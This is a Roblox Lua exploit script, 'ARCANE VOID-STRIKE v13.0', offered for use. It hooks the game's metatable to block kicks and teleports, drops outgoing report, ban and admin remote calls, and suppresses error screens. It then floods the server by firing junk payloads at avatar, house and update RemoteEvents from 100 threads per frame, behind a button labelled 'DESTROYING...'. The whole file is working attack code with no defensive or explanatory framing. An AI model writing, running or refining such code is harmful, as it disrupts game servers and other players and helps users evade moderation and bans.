--[[ 
    🔱 ARCANE VOID-STRIKE v13.0 [ARCANE-ETERNAL] 🔱
    "They can ban the body, but they cannot ban the code. <3"
    
    ETERNAL PROTECTION:
    - [AUTO-SHIELD] : Protection active milliseconds after injection.
    - [DUAL-HOOK] : Secure __namecall AND __index metamethods.
    - [GHOST-LAYERS] : Hides UI errors to prevent "Kick Screen".
    - [IMPACT-CORE V2] : Optimized threading for maximum damage.
    - [ANTI-REPORT] : Blocks outgoing report requests.
]]

-- 1. ETERNAL SHIELD (AUTO-EXECUTE)
if not getgenv().EternalLoaded then
    getgenv().EternalLoaded = true
    
    local P = game:GetService("Players")
    local L = P.LocalPlayer
    local RS = game:GetService("RunService")
    
    -- HOOKING (THE WALL)
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    
    local oldNC = mt.__namecall
    local oldIDX = mt.__index
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- BAN BLOCKER
        if method == "Kick" or method == "kick" or method == "OnTeleport" then
            return nil -- REFUSED
        end
        
        -- REPORT BLOCKER
        if method == "FireServer" and self.Name == "RemoteEvent" then
            local n = self.Name:lower()
            if n:find("report") or n:find("ban") or n:find("kick") or n:find("admin") then
                return nil
            end
        end
        
        return oldNC(self, ...)
    end)
    
    -- ANTI-KICK SCREEN
    mt.__index = newcclosure(function(self, k)
        if tostring(self) == "Kick" or tostring(k) == "Kick" then
            return function() end -- Dummy function
        end
        return oldIDX(self, k)
    end)
    
    setreadonly(mt, true)
    
    -- UI ERROR SUPPRESSION
    pcall(function()
        game:GetService("GuiService").ErrorMessageChanged:Connect(function()
            game:GetService("GuiService"):ClearError()
        end)
    end)
end

-- 2. IMPACT ENGINE V2
local active = { power = 0 }
local PAYLOAD = table.create(200, "🔱ETERNAL🔱")

local function getTargets()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            if n:find("update") or n:find("avatar") or n:find("house") then
                table.insert(t, v)
            end
        end
    end
    return t
end

local function runEternal()
    local targets = getTargets()
    if #targets == 0 then return end
    
    RS.Heartbeat:Connect(function()
        if active.power == 0 then return end
        
        -- 100 Threads / Frame (MAXIMUM OVERDRIVE)
        for i = 1, 100 do
            task.spawn(function()
                local r = targets[math.random(1, #targets)]
                if r then
                    pcall(function() r:FireServer(PAYLOAD, PAYLOAD) end)
                end
            end)
        end
    end)
end

-- 3. ETERNAL UI
local function loadUI()
    local ScreenGui = Instance.new("ScreenGui")
    pcall(function() ScreenGui.Parent = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui") end)
    ScreenGui.Name = "ArcaneEternal_v13"

    local Main = Instance.new("Frame", ScreenGui)
    Main.Size = UDim2.new(0, 300, 0, 150)
    Main.Position = UDim2.new(0.5, -150, 0.5, -75)
    Main.BackgroundColor3 = Color3.fromRGB(10, 0, 10)
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(150, 0, 150)
    Main.Active = true
    Main.Draggable = true

    local Title = Instance.new("TextLabel", Main)
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Text = "🔱 ARCANE-ETERNAL v13.0"
    Title.TextColor3 = Color3.fromRGB(200, 0, 200)
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 18
    Title.BackgroundTransparency = 1

    local Status = Instance.new("TextLabel", Main)
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0, 40)
    Status.Text = "SHIELD: ACTIVE (AUTO)"
    Status.TextColor3 = Color3.fromRGB(0, 255, 0)
    Status.Font = Enum.Font.Code
    Status.TextSize = 12
    Status.BackgroundTransparency = 1

    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.9, 0, 0, 60)
    Btn.Position = UDim2.new(0.05, 0, 0, 70)
    Btn.BackgroundColor3 = Color3.fromRGB(40, 0, 40)
    Btn.Text = "🔥 ETERNAL IMPACT"
    Btn.TextColor3 = Color3.fromRGB(255, 0, 0)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 18
    
    Btn.MouseButton1Click:Connect(function()
        active.power = 1
        Status.Text = "STATUS: DESTROYING..."
        Status.TextColor3 = Color3.fromRGB(255, 0, 0)
        task.spawn(runEternal)
    end)
end

task.spawn(loadUI)
